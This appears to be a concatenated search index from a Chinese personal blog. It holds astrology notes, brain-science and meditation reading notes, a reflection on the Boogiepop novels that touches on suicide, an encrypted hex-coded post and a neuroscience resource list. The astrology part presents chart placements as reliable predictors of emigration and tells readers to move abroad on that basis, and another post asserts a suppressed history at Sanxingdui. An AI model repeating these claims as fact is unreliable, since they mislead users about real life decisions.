一颗跟一个星座关系很密切的行星被叫做那个星座的守护行星。 一颗行星落陷的星座总是跟它守护的星座相冲。 月亮交点即使一个新出生的婴儿也有一个过去。 月亮的南北交点将星盘跟历史联系在一起。 南交点：我们的祖先对我们的影响。轮回中的业力。本能和自动的模式。通过生活自然和不费力的流动。擅长而丧失创新。 南交点的星座会添加上“怎样”和“为什么”：它代表了一种在你里面自然升起的思维倾向和驱动模式，这种模式可能永远都不会受到挑战。 但是他的认知被一些无意识的偏见所影响了。 北交点：我们成长的前沿。南交点的解药。 领域：正在进行时的生活。所有这些都跟南交点的每一个偏好相反。在过去和未来之间挣扎，这个人必须做出一个选择。为了成长，他或者她需要北交点。但是得到它需要很多的努力，也许还需要帮助，一定还需要一些尴尬。另一个选择总是在引诱这个人走那条容易的路：再一次演南交点的那些戏剧，待在安全的地方。如果他选择了这条路的话，那么他将看起来像一个大师，但是死的时候感觉自己像个傻瓜。 ⭐三大巨头——性格的骨架 第一原则：在你能够完全透彻地理解了太阳、月亮和上升之前，忽略所有其它信息。 太阳：自我。个性，价值观，生命动机。——我是一个独特的人，拥有某一种天性和某一些无意识的倾向 月亮：灵魂。主观因素，本能维度，精神的心情。——我们的感受和恐惧、我们的情感需要和我们的喜爱 上升：面具。 太阳、月亮、和上升：个性，个性背后的灵魂，以及它在世间所戴的面具。 我以前一直不确定自己是具体几点出生的。我妈妈说，我是十一点半出生的。但是我爸在照片册里写的却是十点二十。所以我以三大巨头的性格倒推哪一个才是真的？因为这一个小时的变动，三大巨头的变化也是巨大的。最后我发现妈妈说的是正确的！ 五个步骤 第一步找到你的太阳，它的 “什么”就是个性的形成？看看它所在的星座。为什么这个人活着？他的进化目标是什么？他怎样才能最有效地实现它？它所面临的危险是什么？现在加上太阳的宫位。他在哪里会遭遇到这些太阳的自我形成的问题？他生活的主要战场在哪里？ 第二步找到你的月亮。它的“什么”是这个人的主观、情绪特质的形成。它以哪个星座的形式表现？哪些体验对他的幸福来说最重要？他怎样获得它们？当他被情绪和不理解控制时，它们是如何表达的？现在加上月亮的宫位。他在哪里会面临生活中最激烈的情绪问题？他在哪里必须学会以最本能和超越理性的方式做出最实际的选择？在哪里他必须信任自己的“灵魂”？ 第三步看看上升。这并不是一个行星，不过我们的步骤非常类似。对世界来说，这个人看起来是什么样子？他的面具是什么？哪种社会人格对他来说最合适做为一种舒服的日常身份？这个面具跟我们在太阳和月亮中看到的有什么不一样？有什么相似之处？这些对比会带来什么相互加强或者问题？ 第四步看看这三者之间的相位关系。太阳、月亮、和上升是怎样连接的？你也许会找到几个这样的相位，也许一个都找不到。如果你的确发现了一个这样的相位，尝试去理解这些人格主要要素之间是如何连接在一起的。这带来了什么增益？有什么危险？ 第五步这是最难的一步，也是最重要的一步。感觉一下这个人的三要素。如果你只能用一句话来描述它，会是什么？这个人是什么？有水元素和内向宫位的加强吗？三要素的质感主要是外向吗？玩闹吗？严肃吗？自大？害羞？把握它，你就建立了一个分析星盘其它部份的基本氛围。如果没有把握，你的解释就会碎片和分散化。 ⭐半球侧重地平线：上下两个半球。 上半球：客观。 下半球：主观。 竖直线&#x2F;子午线：东左西右。 东边：自由和个人选择。 西边：命运或者宿命。 当大部分行星落在地平线之上时，这个人的生活主要集中在客观领域中：他或者她会通过设计一系列的事件来成长，通过它们将进化后的个性得到了公开和可见的表达。这种格局并不总是会代表社交和外向的个性。但是它表示从长期来看，这个人不会很快乐地从世界中退出。世界是他的广场，如果他从那里退出，成长就不可能发生。而如果没有成长，快乐也是不可能的。 ⭐焦点行星——入旺 即使一个非常强的焦点行星也可能有一两个衰弱之处。我们必须均衡各个因素，做出自己的判断。 上升星座的守护星——建立自己的个人独特性和身份感 跟太阳相合的行星 星群 合轴行星 星盘的四个轴——上升、下降、中天、和天底——是力量之点。任何一个跟它们相合的行星马上就被弹射到了一个极端重要的位置。 真正合轴的行星是最显要的，但是落在任何一根轴之后的宫位里面的行星也是重要的。第一宫、第四宫、第七宫、第十宫，这些宫位是本位宫位（angular houses），落在这些宫位里的行星地位也都会得到提升。它也会变成一个焦点行星。 上升点是四轴中最敏感的一个。一颗跟上升相合或者落在第一宫的行星必须被认真对待。对待它就象对待上升的守护星一样。解读它的逻辑也跟上升是一样的，只是现在是：这颗行星成了这个人面具的一部分，加深或者强烈改变上升星座的信息。就象上升一样，它会影响这个人的样子和个人风格。 孤 星 一颗单独落在任何四个半球中一个中的行星。 静止行星 当一颗行星在天空中停止下来，准备逆行或者前行时，它就静止了。 强烈相位 ⭐南北交点 通过比较南交点和整个星盘，我们决定这个人从前所做的和现在想要通过这个星盘所完成的之间有什么拉扯。 北交点告诉我们自己必须成为什么样子。不是我们将会成为的，不是命运，不是宿命，只是方向。 ⭐找出星盘中的模式和主题发现行星之间的联系，注意主题之间的相互联系以及拉扯。 🚩《变幻的天空》——推运🚩其他感兴趣的问题如何判断是否适合去海外留学发展移民？🚗我参考资料： https://mp.weixin.qq.com/s/Nza8ET237ScQlHPXFOo_Iw https://mp.weixin.qq.com/s/x7Vy1PcbQrN3gHn0lH5xlA 1、移民配置： 指标配置一： 第一宫的宫主星落入第十二宫。这是一个非常强烈的指标说明你会移民海外，如果你现在还没有这方面的打算和计划，且自己还是长期居住在自己的出生地附近，并觉得自己的人生各种受限没有什么发展的话，建议是可以换一个环境，越远越好，然后人生可能就有转机了。 背后的逻辑：很简单，第一宫代表了物理的你，所以第一宫的宫主星去到了代表了“海外”的十二宫就自然是你自己去到了海外。同时第一宫代表了自信和自我的程度，所以同时也说明在你去到”海外”后，你的自信和自我会就会开始得到提升和发展，因为种子在，你要给放到它需要的土壤里。 宫位 星座 宫主星（命主星） 飞入 1宫 水瓶 土星 白羊（陷） 2宫 1宫 水瓶 天王 水瓶（庙） 12宫 指标配置二： 第二宫的宫主星落陷；第二宫宫内有土星或者南北交点；第二宫的宫主星落第十二宫。 这几个配置的话具体看情况，有可能是离开出生地比较远，不一定是出国去海外长期定居，但是也不排除，同时或者可能是有和海外相关的工作。尤其是土星或南北交点落第二宫的话，可能很早就会和家人分离（土星耀升、入庙或者庙旺的话除外）而去到比较远的地方或者是海外。 背后的逻辑：第二宫是一个关于我们和原生家庭链接的宫，第二宫宫主星落陷则说明这个链接弱，同时土星和南北交点都是代表了分离的星，土星代表了文化差异，南北交点一般代表了异域和海外。同时第二宫代表了我们的食物，从我们出生（第一宫）之后要继续存活就需要第二宫的“食物”的供养，第二宫宫主星落入第十二宫，所以“食物”来自于海外，因此也有一定的可能性。 宫位 星座 宫主星 飞入 2宫 双鱼 木星 水瓶 1宫 2宫 双鱼 海王 摩羯 12宫 第二宫宫内有土星。 2、和工作学习机会相关的临时性的海外长期居住配置： 指标配置一： 第九宫宫主星落第十二宫，还有第五宫宫主星落第十二宫。撸主自己也是第五宫宫主星落第十二宫，所以这个只是临时性的，只是临时性的一段比较长期的海外居住，就是留学啦。 背后的逻辑：这两个宫都是关于教育的宫，所以这个就是一个出国留学的标配。 宫位 星座 宫主星 飞入 9宫 天蝎 火星 摩羯 12宫 9宫 天蝎 冥王 射手 10宫 3、有利于国外发展的星盘配置 https://mp.weixin.qq.com/s/B-wHq949TzroqpvD-P9k5Q 东方基础资料——某公众号 https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg2NjU1MzY2Ng==&amp;action=getalbum&amp;album_id=2488851579035631618&amp;scene=173&amp;from_msgid=2247484714&amp;from_itemidx=1&amp;count","tags":["read","metaphysics"],"categories":["Read"]},{"title":"大脑驭手-阅读笔记","path":"/2024/01/19/阅读/《大脑驭手》阅读笔记/","content":"作为艺术的意识哈哈，写的很优美也很艺术，但是，我全部都不认同。 记忆中枢 20 世纪60年代，当时的MIT心理学家韦恩·威克尔格伦(Wayne Wickelgren)提出，海马区能促进大脑外部皮层新皮质中永久记忆的形成。这些皮层记忆采取强化神经元之间联系的形式。因此，新皮质类似于存储库，而海马区则像是记忆的构建者，无论是情景记忆(比如我对遇见Henry的记忆)，还是语义记忆(比如一个词的含义)。这一想法在很大程度上源自与Henry的合作，它是对早期理论的一个巨大修正。此前，研究人员认为海马区是记忆的直接存储库。由于Henry的新皮质没有受到损伤，因此手术前存储的单词记忆应该是完整的。 海马复合体必定参与了保存旧记忆和制造新记忆的过程。就像一个建筑工人可以建造一个新结构或修复一个受损结构一样，海马体也可以制造新记忆来替换那些随时间推移而退化或破碎的记忆。 每当有人回忆起一个被遗忘的单词或过去的个人轶事时，这种重建就可能发生。通过这种方式，近期的接触和学习可以加固受损的记忆并减少记忆丢失。在Henry 的情况中，这种海马体维护系统失效了。Henry无法通过重新经历和学习修复破碎的记忆，导致记忆加速退化。 大脑中的GPS记忆宫殿的科学原理。 冥想之力重塑大脑冥想的种类 专注冥想(focused- attention meditation)：旨在控制大脑，将注意力集中在当前时刻，同时提高冥想者对分散注意力的东西保持警惕的能力。 正念冥想(mindfulness)或称“开放监视”冥想(open- monitoring meditation)：旨在让冥想者减少对当前想法和感觉的情绪反应，以防情绪失控和精神痛苦。在正念冥想过程中，冥想者须时刻留心自己的所有感受，但又不能将注意力集中在任何特定感受上。 慈悲和仁爱冥想：培养冥想者的同情心和利他精神，同时把对个人的专注倾向最小化。 专注冥想的大脑认知周期的4个阶段：大脑走神阶段、意识到注意力分散阶段、重新集中注意力阶段以及恢复专注阶段。 周期第一阶段即在冥想者走神时，大脑默认模式网络(default-mode network,以下简称DMN)的活动就会增加。大脑默认模式网络包括这些区域：内侧前额叶皮层(medial prefrontal cortex)、后扣带回皮层(posterior cingulate cortex)、楔前叶(precuneus)、顶下小叶(inferior parietal lobe)以及外侧颞叶皮层(lateral temporal cortex )。目前已知，人在走神时，DMN会被激活，在建立和更新人们的内心世界时发挥广泛的作用(人们内心世界的建立是基于自我和对他人的长时记忆)。 周期第二阶段大脑的活动区域转移到其他脑区，比如前脑岛(anteriorinsula)和前扣带回皮层(anterior cingulate cortex)，也就是我们所谓的“凸显网络”( salience network)。这一网络可以调控我们的主观感受，而这些感受可能会导致我们在执行任务期间分心。一般认为，“凸显网络”在感知新事件时会发挥重要作用。而在冥想期间，“凸显网络”可以切换各个神经元群的活动状态，比如，把注意力从大脑默认模式网络转移到其他地方。 周期第三阶段涉及另外两个大脑区域:背外侧前额叶皮层(dorsolateral prefrontal cortex )和顶下小叶(inferior parietal lobe)。它们可以让注意力离开任何让人走神的外界刺激，从而让冥想者重新集中注意力。 周期第四阶段位于前额之后的背外侧前额叶皮层活动会增多，这通常表明注意力已经集中在某一对象上，比如呼吸。 引申 高级冥想者可以更快达到聚精会神的状态。消耗更少能量做更多事情。 冥想者有更强保持警觉的能力。 冥想者的大脑对高音的反应表现的更加稳定。 正念冥想的大脑 无反应式感官知觉的增强。 冥想者可以更好地分配自己的注意力。 疼痛感在冥想者身上并不会减轻，但对冥想者造成的困扰显然不像对照组中那么明显。 在疼痛刺激出现之前，资深冥想者大脑中与焦虑有关的区域-岛叶皮层(insular cortex)和杏仁核(amygdala)的神经活动会减少。 可以提高人体对基本生理反应（例如应激激素水平和炎症反应）的掌握。 有利于缓解焦虑与抑郁症状，改善睡眠质量。 降低抑郁症复发概率。 慈悲和仁爱冥想的大脑 冥想者对他人遭遇感同身受的能力有所提升，而且他们在情感上也没有对比表现出难以承受的迹象。 增强亲社会行为，助人能力。 更少的情绪衰竭。 冥想带来的变化 维持一种特殊脑电活动。γ频段震荡，25HZ和42HZ相位同步。 布罗德曼9区与10区激活，变大。 处理恐惧情绪杏仁核变小。 资深冥想者进行一天的高强度正念冥想训练，可以降低与炎症相关的基因的活性，并改变可以促进或抑制基因表达的酶的功能。 正念冥想训练或能减缓某些冥想者的细胞衰老进程。 寻找最佳大脑食谱 地中海控糖饮食可以缓解炎症，增加免疫力，缓解抑郁症焦虑症，预防痴呆。 DHA也很关键。促进脑神经连接与发育。 肠道生物群对健康有影响。 研究前沿 “突显特性”，相互作用的系统。猜测需要物理数学等等方面的知识做理论了。 EEG记录几毫秒内脑电波起伏震荡，无法监测单个神经元活动。 fMRI监测血流变化，记录过程缓慢，分辨率低。 钙成像，电压成像，新型材料，纳米技术。 分子磁带，电子，光子。 操纵神经元，神经回路。 类脑器官 脑机接口","tags":["read","science"],"categories":["Read"]},{"title":"诡异的泡泡——Boogiepop的全系列思考","path":"/2024/01/18/胡言乱语/诡异的泡泡——Boogiepop的全系列思考/","content":"第一卷：幻影死神一个第一卷就彻彻底底完结的故事。来自二十七年前的故事。 我最喜欢的角色雾间zhi，也是我理想中希望成为的模样。 普通是什么？ 雾间诚一给出了答案：“普通就是放手不管并一直维持这种样子。” 放弃普通的生活，去拯救世界，让自己成为世界的可能性，去参与，去干涉，去改变，甚至引发革命。 人生短短几十年罢了。要爆发出那种最热烈最耀眼的光。 时刻记着自己的使命与意志，不要走偏，时常内观，不要一昧追求刺激却走向了世界的反面。 关于zhi的恋父情结来源于弗洛伊德的俄狄浦斯。好的是我不信这一套，不信任何传统精神分析的大多数。我相信也没多少人相信了，哈哈。 我信什么呢？ 我信某些远古的母系传承，证据就在三星堆，只是某些人出于不想颠覆正统历史，他们一直拖延以至于妄图掩盖某些真相。 仿佛某一天觉醒。起来忽然感受到了某种使命。探索未知，将自我看作世界的可能性向脑海中的理想奔腾而去。 补记 ——关于食人之物原帖：https://tieba.baidu.com/p/6057013919?pid=124470890136&amp;cid=0#124470890136 b站方便阅读：https://www.bilibili.com/read/cv2235353/ 关于补记的解读。 句子 ‘凪，你怎么看待普通这件事？’ 我觉得他不知所谓。所以摇了摇头。然后他这么说。 ‘普通就是放手不管并且一直维持这种样子。所以，我很讨厌普通，必须变得不普通。所以，我——’ 结果，这就是他的遗言。他失去了意识，没有再醒过来。死因是胃穿孔引起的内脏溶解——死得很恶心。医生剖开他的肚子时，里面臭的很厉害，据说跟他非常熟悉的护士都吐了。 所以该怎么说呢，我也不太懂。从那之后，我就放弃了普通的生活方式。” 她淡淡地说。 我没有说话，只是沉默着。而她突然说。 “弥赛亚情结。”（译注：MessiahComplex，即救世主意识。） “……是吗？” 只看面容她是位文静的美女，我盯着她薄薄的嘴唇。不知怎么我无法直视她的眼睛。 “啊啊。我是有病的。幼儿体验也够多的了。” 她若无其事地说出恐怖的事。 但是我只把她看成是偏执狂。 MISIC“Echoes” by Pink Floyd：https://music.163.com/song?id=2016710373&amp;userid=272232716 看到评论区有人提到《2001太空漫游》，只能说，太像了。一个1968一个1971~呼呼，都是上个世纪的，我现在听起来是不是也算文艺复兴呢？ 瓦格纳：歌剧《纽伦堡的名歌手》：https://music.163.com/playlist?id=28674823&amp;userid=272232716（p.s.瓦格纳，希特勒最喜欢的作曲家之一。） 第二卷：VS Imaginator Part I “SIGN”补记——堕落与幻灭之间https://www.bilibili.com/read/cv2235505/?spm_id_from=333.999.0.0 句子序章 “小宫同学，在这个世上，没有什么事是绝对的。一切都是不确定的，不管发生什么都不会不自然’…有时小鸟会从天上落下，四月也会下雪。” 第一章 123如果你想做个善良的人，就不要顾及未来。因为在大多数情况下，你只会走向扭曲的方向。——雾间诚一《VS幻想者》 “就算进入了一流大学，烦恼也不会消失，也不能保证将来的幸福。认真努力进入大学后却不知道该做什么，一片茫然的人有根多，因为他们只知道学习，不知道还能做其他的什么事。因为不知道做什么，就以参加一级公务员考试为目标，毫无意义地缩窄了自己的前途。即使面前出现应当爱上的人，也不会觉察到对方的价值，在不彻不间失去重要的事物。” “即便待在大学里，心情也跟高考生一样。能够直率地接受这一点的人太少了。大多数人都会堕落。然后再次成为流浪者。将宝贵的青春在流浪中度过，精神也变得乖张起来——” “你好像不知不觉已经知道了这一点。即使如此还是不想考虑这些，拼命努力。但是一一努力跟把视线从现实中移开是两回事。不要勉强自己，这种话在现在的考试体制中也说不出口。不十分努力就无法合格。但是，即便如此对它的成果期望过高也不好。我接下来的说法可能很陈旧，进入大学并不代表人生。你的阴影之梦是在无意识的情况下对于‘进入大学’‘略有期待’这件事产生了发自心底的暗示。我认为你应该冷静下来。” 但是，这孩子心中有种“为什么我没有决定性的出众之处呢？’的想法。有时看到一无所有的人拥有其实无所调的热情时，就会十分困惑。她会羡慕得不得了一一也一直拥有这种烦恼。 也是我2019年初的困惑。某个领域的深度以及对其爆发宗教狂热般的热情。 “正确来说应该是‘显现于现在的未来’。或者该说是‘建立于可能性假说之上的实体化’。” 第二章 123恋爱是人类的自由。但我只会祈祷它不要让人们毁灭彼此的精神。——雾间诚一《VS幻想者》 第三章 123不要再怀疑自己的工作了。无论是多么没有意义、没有价值的工作，坦减面对自已的工作铁是如此才是正确的做法。——雾间诚一《VS幻想者》 但是一一过去的我差点被陌生人杀掉，而我却是在一切都结束之后才知道真相一一就因为这样，我一直渴望着一件事。跟“黑暗”正面相遇并“对决”。 第四章 为何畏惧黑暗？生活本身就是“前路漆黑”。——雾间诚一《VS幻想者》 第五章 12想变轻松很容易。失去灵魂即可。——雾间诚一《VS幻想者》 第六章 1234解除所有混乱的说法是不正确的。有时混乱只是直接成为了稳固的存在，制约着这个世界。正如缺乏理论背景，却依然能够发挥效果的诅咒一般……——雾间诚一《VS幻想者》 ​ 说实话，我读过很多关于异常心理的书，却完全不理解自杀者的心理。​ 那些书里当然也记载着对自杀未遂的生还者的访谈。但是，那些只不过是“没有死成”的人所说的话。而且，这些人之后多半没有再次挑战自杀，而是继续生存下去。​ 真正死去的人肯定有着决定性的不同。即使有那种心中重复着未遂行为，最终真的死去的作家，也是坦诚地写“我其实不想死，只是为了配合对方的执着”。最后此人真的死去，好像也是因为自杀未遂的演练失败了而已。​ 从本质上来说，真正自杀死去的人是不会留下遗书之类重要信息的一一我不禁这样认为。​ 水乃星透子又是如何呢？ ​ “哎呀，我很清楚不能说只要活着，一切都会顺利这种简单的结论。但是，该怎么说呢，即使你死了，你憎恨的东西，还有无论如何也无法原凉的事都绝对无法从世间消失。也就是说，该怎么讲好呢末真喋喋不休地说着，不知何时已经来到附近。​ 她猛地抓住绮的手臂。​ 绮看着她用力的手，又看向她的脸。​ “——死了也没用。我只想说这些。” “不过呢，他好像总给人一种‘杀手’啊‘死神’之类的印象。而言之就是‘青春期’。因为自己很不安定，就干脆把一起都破坏掉一类似于这样的心情。或者说是想要杀人的心情。” “大人总是不负责任地说‘不安定仅限于这段时期。他们很快就冷静起来’之类的。其实没有那么简单。” “不吉波普。就是为此而存在。守护无法冷静的心，让它保持原状。我是这么认为的。…不过，相信他的存在也可以说是一种幸福吧。” “人类是绝对不可能在不被任何人讨厌的情况下活着的。” “他是个小说家，不过我完全没有读过他的小说。此人曾经在他的书中这么说。 …确实存在想要别人‘必须如何’的人。这些人混入了人群之中，总有一天会在世间声张自我。”末真流利地背出书中一个小节。她自己认为这很正常，但是流利背出这种内容正是别人认为她奇怪的原因，只不过本人还没有自觉。“…人类的一生倘若想要拥有某种价值，就只有跟那种人战斗。跟取代了自己，思考伟大之事的幻想者进行对决的VS幻想者一一这才是人类最先身处的位置。’…就是这样。不过呢，虽然我啰里啰嗦地说了这么多，简而言之就是，人类会在拥有自觉的前提下，受到世间常识这道枷锁的束缚，从而感受到痛苦。”“枷锁…”“没错。如果被束缚住，就必须从中逃脱。他就是这个意思吧。” “虽然我这样说真的有些装腔作势，不过，你多半是缺乏‘战斗的念头吧。没有这种念头可不行哦。” 后记——怪异且流行之物 不过所谓的“偷工减料”其实就是“适当地放弃已经教条化的过去，开拓通往未来的可能性”。 流行文化最棒之处在于无论如何都很难成为权威。不能说是完全不存在，但几乎没有。 不过，即便如此，我还是要以流行为目标。这已经成为了我的人生命题，因此我也无可奈何。我这样做的产物总是有些不吉（怪异），虽然想说不是我的错，但果然还是我不对…即使如此，我还会坚持下去。我相信总有一天，怪异且流行之物也会成为真正的流行。 汉化资源github.com&#x2F;sw-meteo&#x2F;boogiepop 英译：https://www.threatstotheworld.com/main-novels 2024.01.19：今天上贴吧看到了有人搬运，似乎还有英译版本，令人无语的是，第九卷的汉化依然是无。到这个程度我自己都想试试把英译的汉化过来了啊啊啊啊啊啊（原帖：https://tieba.baidu.com/p/8352039280?pn=1）","tags":["阅读","科幻","随笔"],"categories":["Read"]},{"title":"TPCP10-note4&6","path":"/2024/01/04/胡言乱语/TPCP10-4精神分析疗法/","content":"51d7236bce0fa05d2beeceda4309d0f6080d0a20957b60f83559f3283a1efc5a6cc59c517e8e305a0b515eed42718b610ef73ec16de81ead82a1a0d958ad6c8a8048d1a86fea1f4c50f41b98ea38c65ea043543ee7a4bf1b69ca35d2fbc2486a963d77aa4123743efea6bd1c2a4dd12c0199e7359cb6960d58103294f30c9f9b17e9b7e360b892fddd9b16cad3e327f0ce2abdf5dff9657f35a91b3122674c6bcff51e44ffab17ab87a0f3453154b446f1b54af43e54da29d3cc2db3d8b7b430d14700dc8ffa9f728138c61bfc29120f84d9f609863e1aa862b15d1c183d5281776cf804b942de21b3def097db6f382c58c59bd46ce92eefa1579736380d7a8522a247ddc71b2623fc5a60abe04f73dd1ecfc391aadc4a5f80983350f670713e399f3931b6b662108f50440c37744247bddf48a3598ffc5eff81d6b676e397cd041b499b21792f2af0db88a37775195af057dd932025c748e43c654d26385ee8bad409dce89b1be44dbe8b2e4786f163d4eec3b09d160c73ec13cb4ecab959626e46f22a240d640beed0dfe5eec45f5e2d62761fd73d9aad668a4850e8553d90ec6279b103d4453e4f538391c63044fbda47eb115360911790944963c74e3084856812438b9e41d972712a864a9e3f961fcfecd998e2aefe16a641799c2a9c5e4a99c5e31ea08d74f3cad45f19e9d0caed97f28fab7a8db2b13347a218009ede1b0b99327326621023697a023a723820722766b427b68fee782dd4040ed90e0ac7c6bff6bcb2b69e415f9acb39a9597fdd0f2c1a325455addec26bcbcdcc46d88b513c398c180f3d691b4d266d062050d9a41d004490aa8baad9d46bead1b4fe5db5d431528c8128e312caf31f5f7cb893048bf8264240c42b8a44f84cef5e2544412755c9f671438db3e7d7111e2fe20eb34cc2334ffb51316183de77f93fad09c0b200b559e6e380fc9e3ae8e525f0481fcd8914d8fb4c58bc5ae8446069ecc44c79b4f59edbc7ea6fe229b8f239e51e1fa7737ec887627662166816fb1015d64b4ce4e62f07950e4f752cf4f0df89b3eac643aefa59e3d3aeddf9cace0ad1b73bb7260fe8fcf72b4308955d47960c6b63f964dec3edff7426bff54a1e8de9d66d06cc7909a890177a4046f7da43dc57e46f9e14eb2910c58da173b1cb0d2d0b1052b60e0e29b7412ffd63af6fcb19d77df93e234e6af9f52a30e60835e6e8a5f8cecd683617ea11da509c7b2d3d71e91f5a6bc2d520382c948af8f5c122c36ad0394090bf1183a9d460189df68904bc8730ae730b70a804c5667bc3028cff7fba121510aac200803633a747835423d6b48c99706e9eb5f1a06c95544b38602eed1ed62eff044c1d1cd1639a609c72518f0c21169a1decef7e6140f65ac9895bf6ef26c02ee5664e4c070a64e5c94a0af72b7daa2e7064c676ba6cfd7a0a02a0c712de35e7ba0de6b217cdc27f5f5b5f3ad50798fde146499b918f0e8db7e64d04d3c7c3d757a753ec1e7f0f5a54a690c6a121b36ff0b28d49ebb6cf8ea9f1091e97e4dbe42b2bfc1657559f3f44b2f189d29d799d6cd0784a8f34564f87c3c87e8a3491f36965455ca3ae9ea3c7941287905304a037ee23b5c4045b82e929e1c382303adac8470fa67d13535f70a0a13f99439cc3dde81efb0a96b30b6b469cc7ee37bf9cdd2fd01df815bbf447beabec8dcd0c619151e1d5144403da16166390e79105f208c560f2933596d0c964d97da15671843ec82db234be06d834a3c0de5c5767f43dd26c5dc17968781651efc720753cc062ca44132d33d4bd2e99d07913cd9af8f62694e5a862b81c1d7e8b9114aab1408ef0e4f3b91c57fa682d6fc5b68799886cceadb1e7add9d5d384f887d5d058d8866e1d1237fef0ef7233c7ed89fb9c4a7d7eb3aab3c4f15a110c30575f44b99bc6dcc246bd8610c88b4ce24ca468148bb25418f135774ec41ba0f85f21e99b8db8b133a5e9b19f946f4fe9c78cbbd3bfc929d1d9cc586f5d10b1356f1fd2ca11158b013d6ee751e44552958885d965cad8684d5c0b32896a41969d8545924afb55c8bcd10a4fb034014940057dd1817816e1991ed3aa1bdf4f49534d24400efedd9ccddb0d856b05a1f836f3c4c68ca24f55b3ea75a1208770fec8c26f3f4aa144147374619997727879795554d03a96d46fbc8299e6f3a5e5c1d872379dd0b918a91b74eed49ce6f1340101cc2c84207e57b430c1af9c0e45dfaa6ffa66d5acc9432030fa2b8e33738b512b0e8575fa4cdcde2e1608e0c0aed810d9d903dab4a92cbe2ca9d6cb4347466ee3f6680f6e1a077af5dc28419703f7428ec3f1a3f71623f8f93bcc60f02838ac04bd518d744e68e22a58188bcd367487ac2ca1e2ad29ab63a4ff8ebb21c387a06a83d8e87bf1d56245b5379466c267f6434c75741c537cd510d0c060044d5986e5547b2f80733849b0859f5c24dc973e8bcdc97f595ab2770efa912bcd12698cfc88a8e40aca246447b9735707fc13d89176cb50cca390e8bd873cb1bf2a728c51e342521f1e89c869cb9f3a87ea099449b2f3cb3fc494c70d34ebaa263a5d019ca633ba84bd3f2f8d31797875025fca3c9e47dbd25057a225c03e8d9532a95c5b1842e9f11a8511e8a91700e74bb5c51ba909ff8c9c52177a11efe2a30eb981ae7de8a04a0879bce60308e6eaf8437e3eaed1d0fefd4cdc8aa297740974e570a6eb983eb342dc854f29b9603f5d72c4c825ac1a1a6675cfac9eeeebff79704a4e519705ea91f159bd4fe321891f4d6c9eecc6f1da12788618f6c195ed04d4f4ab91cf1a49e991aa225232a6463e4b07124a035b49dfd34ae55ccb352512ac38826e509dd312b401ecc976b9284722932e1e1410ae5b1c224c9fed840a573b9a551e82f1da1fae9d685f38f6ebd1b63a665ceded59847ce38c3c01f4241a81a0300e72f0b67d4c355cd697571d56ace89dd0e09732e8b30d601d8ea2f33b72b30d4ab6e1f4e8fdb174d43f7f35b99feccd25ca0c91821b040295b898c5c4ca03edf1b895375a073e4153db125f3e380d5588af6928420089661c9332cb5019242d578ccf310f90b381687ff6cabbec18160eac78d0c979f5c62c4553b5f3b749e0bca15dfeec98b2937a306c21bcdc0c6b5f3fccef9d117754871dd582e7475b8b21569153020a36e64614c8106614802e5e8b19686d694c6d30151620a2bcdedfa8391924ddee02222441b8639fc8bc11a55163dfb33554e7c6c73aa0f7b3ec79831a73fcf15dcd640341e4f6f86c5e005f3088c5c95507d1aff6df5a4c1e0ebe2f867f141202dc2a9c03bc1c4a124fdb82713c4d42b2959e51de924257702bf0641b96a4920f07920c0ff55075e366dec37436af28f14d92c34738f997add5a38b903f5f4f854a0a1bb8fad9a698c923fd43925aaf3a88b9a0186a3be4650b520f75069a6cf56c945972e23c3693ea3c4f1af3f9b46e71178c3c2e81d3aaca964be1e7b9917dbd581a1a2939dc9e4f041353191581072b269ddbda0d27882f23017835f62e1f03942d9d31bfd1f4a0e1f11593fad51120f845501e16158394fc80414a6b4c9437536ec95c37e097734a5184e6429d903cd5dd94e12c0f2fae30f9a5a9338b44491c802ecc8fa253f92273366fe443d13f9d4cd18da9747ece65e16a73287079ead9a6e726e8cf76e004a8d58eff33cc9b91934a187f07f353f967adb75c7ff0e55017ec991e22b516e526534593b427d0bd1c07b185994fcd1a715d67422c82c378ff380bc670bb05218ef0a46d1d05f68ea0f797a0eea6c1b0e792a2b88dddb9bf9a503351d20ef07a68d9b379df136715940f9b659d879947b32c419d2d1c8ac8f166de4d6a3403738d774cc406e0f1e4c49ae6157af5563eb5de2330c23ffa03d95069eef61d2beb040dc6585a714a20235579df48e624fddacb4b4005e18e9786a632a5b2736793d5bb278f2cb39bdc0d17285d65272b05a97f2b5c60eb33ea421ed0ffc8e5d6504a406b742256ef7fe5aa5fd84b4f802701a70d01b8974d904f8d3f67b94c6d05f9a9d2af98af839e9d8a41e695eafbd81f192a6f341dcbe7c33f687162c707c586a6b23498c43bd775a442c4480e1698f23ceba352e8565074e126b5ca06272b91378c004d6049f9bffee4844a56514713b5ea9c23f3de6dd61c63b11fc9bd11a9ba4523a112a7b30182a4c7a9a4a8be663511abddb25413de289370e350d4c7b05de4b2d2b5b594131438daeb3b0e8acb0c2b043b8f32888c24883565098b0256ddefa20deccb8f5e04637d38377ba239c6568726f9010f78b5b07126a7baeeced45ef4cf2b2b189b4fb128418b2936535e89b9201669a95346b27943506d74ed9b894081a513007c3534f289fdb572235b6a9e634f5147efbc830dcaf6d6351ae7bff94a076f5df11021fd7d12f459982d7fa624374bc3d37c48a815708bdc2f96b39824116c9e0eaa2ba5493211c3f9ec720d2c253d659f07c366754536397ff229b3bf4eee729523b6fcdddc2e9c2b214de6e54e435d3bbdb5be9011d683ace3e8ed54b480074e5ca72ac4aa37221e9fd23192fbcccefafd7429e60de61887faf776c59ef4e8cba2df6a6b8fa85dad23a0ad00de81c97d764cfc75a4202660b13a82e8656a39386a8183457cf7c2b12e11b5310a0b6133227a3be0899df51c4fbd908a46ad543e992e6c24153fa35a4b86af12a54aac8f768f84da80937038e211edaeb06fdcedf0579ee53be156d7d6a90680fc92e7fe5a3827b250f66f243183050c1c0d24cd04524e4bc62c9b18530a5fbb9b5191212d06bc5c9aaf3231c01ca5d56bd23ad56629c5a7001590e4eef14f2837c490895f12bc8e0dd16d150cf7b19f534a7ebb762e7e727c0f90246a72e57d4a8afc827620fb924d9863376a76fe4a73bfdb42daa6724c99f012155a1657d9e42afd0d86d0d0fc6adbd9ad769cadc6cf7eea121f34775b73 您好, 我没有主动给密码就说明你没有权限.","tags":["阅读","隐藏内容","心理咨询"],"categories":["碎碎念"]},{"title":"神经科学相关资料汇总","path":"/2023/11/13/阅读/神经科学相关资料/","content":"包含在线预览PDF可下载 PDF: Neuroscience: exploring the brain 4thhttps://zlib.pub/book/neuroscience-exploring-the-brain-3907ac6nrmi0 （需要翻墙下载） Coursera: Computational Neuroscience 华盛顿大学https://www.coursera.org/learn/computational-neuroscience PDF: Theoretical Neuroscience 